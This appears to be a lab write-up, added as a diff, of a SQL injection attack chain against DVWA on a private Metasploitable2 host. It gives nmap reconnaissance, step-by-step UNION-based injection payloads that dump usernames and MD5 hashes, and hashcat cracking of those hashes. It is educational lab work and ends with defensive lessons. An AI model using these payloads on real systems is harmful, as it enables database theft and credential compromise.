@@ -1,0 +1,258 @@
+==================================================
+DVWA SQL Injection → Database Extraction
+==================================================
+
+Target:
+Metasploitable2 (DVWA)
+IP: 192.168.56.101
+
+Attacker:
+Kali Linux
+IP: 192.168.56.1
+
+
+==================================================
+Reconnaissance
+==================================================
+
+1. Host Discovery
+
+Command:
+nmap -sn 192.168.56.0/24
+
+Result:
+192.168.56.101 is alive
+
+
+--------------------------------------------------
+
+2. Service Enumeration
+
+Command:
+nmap -p 80 -sV 192.168.56.101
+
+Result:
+80/tcp open  http  Apache httpd 2.2.8 ((Ubuntu))
+
+
+--------------------------------------------------
+
+3. Web Application Identification
+
+URL:
+http://192.168.56.101/dvwa
+
+Result:
+Damn Vulnerable Web Application (DVWA) detected
+
+
+--------------------------------------------------
+
+4. Authentication
+
+Credentials:
+admin : password
+
+Result:
+Successfully authenticated to DVWA dashboard
+
+
+--------------------------------------------------
+
+5. Security Level Configuration
+
+Action:
+Set DVWA Security → LOW
+
+Result:
+Application configured to be vulnerable to injection attacks
+
+
+==================================================
+Exploitation
+==================================================
+
+1. SQL Injection Entry Point
+
+Location:
+DVWA → SQL Injection
+
+Input field:
+User ID parameter vulnerable to SQL injection
+
+
+--------------------------------------------------
+
+2. Authentication Bypass
+
+Payload:
+
+1' OR '1'='1
+
+Result:
+
+- SQL query logic bypassed
+- All user records returned from database
+
+
+--------------------------------------------------
+
+3. Column Enumeration
+
+Payloads:
+
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+
+Result:
+
+- Identified correct number of columns in query
+- Determined structure required for UNION injection
+
+
+--------------------------------------------------
+
+4. Database Enumeration
+
+Payload:
+
+1' UNION SELECT null, database()-- -
+
+Result:
+
+dvwa
+
+Payload:
+
+1' UNION SELECT null, user()-- -
+
+Result:
+
+database user identified
+
+
+--------------------------------------------------
+
+5. Table Enumeration
+
+Payload:
+
+1' UNION SELECT null, table_name FROM information_schema.tables-- -
+
+Result:
+
+- Retrieved list of tables in database
+- Identified "users" table
+
+
+--------------------------------------------------
+
+6. Column Enumeration
+
+Payload:
+
+1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'-- -
+
+Result:
+
+- Identified columns such as:
+    user
+    password
+
+
+--------------------------------------------------
+
+7. Data Extraction
+
+Payload:
+
+1' UNION SELECT user, password FROM users-- -
+
+Result:
+
+- Extracted usernames and password hashes from database
+- Example:
+
+admin : 5f4dcc3b5aa765d61d8327deb882cf99
+
+
+==================================================
+Post-Exploitation
+==================================================
+
+1. Hash Analysis
+
+Hash type:
+MD5
+
+Example:
+
+5f4dcc3b5aa765d61d8327deb882cf99
+
+Result:
+
+- MD5 identified as weak hashing algorithm
+- Suitable for offline cracking
+
+
+--------------------------------------------------
+
+2. Password Cracking
+
+Preparation:
+
+Create file:
+hashes.txt
+
+Format:
+
+5f4dcc3b5aa765d61d8327deb882cf99
+
+
+Command:
+
+hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
+
+
+Result:
+
+password
+
+
+--------------------------------------------------
+
+3. Credential Reuse
+
+Result:
+
+- Valid credentials recovered
+- Potential reuse across application or services
+
+
+==================================================
+Summary
+==================================================
+
+- DVWA application contained SQL injection vulnerability
+- Input was manipulated to bypass query logic
+- Database structure was enumerated step-by-step
+- User credentials were extracted using UNION-based SQL injection
+- Password hashes were cracked offline
+- Plaintext credentials successfully recovered
+
+This demonstrates a full attack chain:
+
+Reconnaissance → Injection → Enumeration → Data Extraction → Password Cracking
+
+
+==================================================
+Key Learning Points
+==================================================
+
+- SQL injection allows direct interaction with backend databases
+- UNION-based attacks enable controlled data extraction
+- information_schema can be used to map database structure
+- Weak hashing algorithms (MD5) are easily cracked
+- Input validation and prepared statements are critical defenses
+- Exploitation is not just access — it includes full data compromise
